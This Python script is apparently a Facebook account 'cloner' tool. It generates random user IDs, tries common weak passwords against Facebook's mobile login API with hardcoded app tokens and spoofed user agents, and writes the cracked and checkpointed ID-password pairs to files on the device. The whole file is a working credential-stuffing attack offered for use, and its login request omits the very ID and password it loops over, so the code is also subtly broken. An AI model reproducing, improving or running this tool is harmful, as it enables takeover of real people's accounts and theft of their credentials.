import os
import sys
import json
import uuid
import string
import random
import requests
from concurrent.futures import ThreadPoolExecutor

# Initial variables
loop = 0  # Tracks the number of requests processed
oks = []  # Stores successful login attempts
cps = []  # Stores failed login attempts
gen = []  # Stores generated IDs

def SEX22():
    """Returns a random User-Agent string from a list."""
    user_agents = [
        'Mozilla/5.0 (Linux; Android 10; Pixel 4 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 9; Samsung Galaxy S9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0'
    ]
    return random.choice(user_agents)

def uax():
    """Generates random User-Agent strings."""
    version_a = str(random.choice(range(10, 20)))
    ua_a = f'Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(5, 7))}.1; en-US) AppleWebKit/534.{version_a} (KHTML, like Gecko) Chrome/{random.choice(range(8, 12))}.0.{random.choice(range(552, 661))}.0 Safari/534.{version_a}'
    version_b = str(random.choice(range(1, 36)))
    version_c = str(random.choice(range(34, 38)))
    ua_b = f'Mozilla/5.0 (Windows NT {random.choice(range(5, 7))}.{random.choice(["2", "1"])}) AppleWebKit/5{version_c}.{version_b} (KHTML, like Gecko) Chrome/{random.choice(range(12, 42))}.0.{random.choice(range(742, 2200))}.{random.choice(range(1, 120))} Safari/5{version_c}.{version_b}'
    return random.choice([ua_a, ua_b])

def generate_user_agent():
    """Generates specific types of Facebook-related User-Agents."""
    devices = ['SM-F711B', 'SM-F711N', 'SM-F711U', 'SM-F711U1', 'SM-E025F']
    device = random.choice(devices)
    return f'[FBAN/FB4A;FBAV/{random.randint(111, 999)}.0.0.{random.randint(1111, 9999)};FBBV/{random.randint(1111111, 9999999)};FBDM/{{density=2.0,width=720,height=1440}};FBLC/en_US;FBRV/{random.randint(111111111, 666666666)};FBCR/Airalo;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{device};FBSV/7.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'

def clear_screen():
    """Clears the terminal screen."""
    os.system('cls' if 'win' in sys.platform else 'clear')

def display_banner():
    """Displays the application banner."""
    clear_screen()
    print('''
    ███████╗██╗  ██╗ ██████╗ ███╗   ██╗ █████╗ 
    ██╔════╝██║  ██║██╔═══██╗████╗  ██║██╔══██╗
    ███████╗███████║██║   ██║██╔██╗ ██║███████║
    ╚════██║██╔══██║██║   ██║██║╚██╗██║██╔══██║
    ███████║██║  ██║╚██████╔╝██║ ╚████║██║  ██║
    ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝
    ============================================
    Owner    : SHONAV-:0.4
    ============================================
    ''')

class OldCloner:
    """Handles the cloning process."""
    def __init__(self):
        self.loop = 0
        self.oks = []
        self.cps = []
        self.gen = []

    def old_clone(self, series):
        """Performs the cloning process for old IDs."""
        display_banner()
        if series == '2008':
            prefix, id_length = '100000', 9
        elif series == '2009':
            prefix, id_length = '1000000', 9
        else:
            prefix, id_length = '10000', 10  # Default

        print('EXAMPLE  - 5000,10000')
        try:
            limit = int(input('SELECT   - '))
        except ValueError:
            print("Please enter a valid number.")
            return

        with ThreadPoolExecutor(max_workers=3) as executor:
            for _ in range(limit):
                uid = ''.join(random.choice(string.digits) for _ in range(id_length))
                self.gen.append(uid)

            display_banner()
            print(f'TOTAL IDS - {len(self.gen)}')
            print(f'UID SERIES - {series}')
            print('IF NO RESULT USE FLIGHT MODE')
            print('-------------------------------')

            for uid in self.gen:
                ids = prefix + uid
                passlist = [
                    '123456', '1234567', '12345678', '123456789',
                   '1234567890', '123123', '112233']
                executor.submit(self.attempt_login, ids, passlist)

    def attempt_login(self, ids, passlist):
        """Attempts to log in with generated IDs."""
        global loop, oks, cps
        for password in passlist:
            sys.stdout.write(f'''\r\x1b[1;37m [SHONA-M3] {loop}|OK-{len(oks)} |CP-{len(cps)}''')
            data = {
                'api_key': '882a8490361da98702bf97a021ddc14d',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler'
            }
            headers = {
                'content-type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'user-agent': generate_user_agent(),
                'accept-encoding': 'gzip, deflate',
                'x-fb-http-engine': 'Liger'
            }
            response = requests.post('https://b-api.facebook.com/auth/login', data=data, headers=headers).text
            result = json.loads(response)

            if 'access_token' in result:
                print(f'SHONA-OK | {ids} • {password}_')
                with open('/sdcard/SHONAOLD-OK.txt', 'a') as f:
                    f.write(f'{ids}|{password}\n')
                oks.append(ids)
            elif 'www.facebook.com' in result.get('error', {}).get('message', ''):
                print(f'SHONA-CP | {ids} • {password}')
                with open('/sdcard/SHONAOLD-CP.txt', 'a') as f:
                    f.write(f'{ids}|{password}\n')
                cps.append(ids)

            loop += 1

if __name__ == '__main__':
    cloner = OldCloner()
    cloner.old_clone('2008')